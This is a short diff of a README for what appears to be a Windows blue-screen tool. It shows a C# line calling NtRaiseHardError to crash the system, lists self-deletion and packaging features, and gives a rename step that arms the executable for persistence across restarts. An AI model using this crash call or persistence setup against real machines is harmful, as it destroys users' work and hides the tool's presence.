@@ -14,11 +14,13 @@ C# Sample Code:
     NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
 ```
 Python version
+
 - Supports compiling using pyinstaller and Nuitka
 - Removes itself from execution directory automatically
 
 # Restart prestance 
 Modify on Line 15:
+
 ```executable = "BSOD.exe.malz"``` to ```"executable = "BSOD.exe"```
 
 # Disclaimer
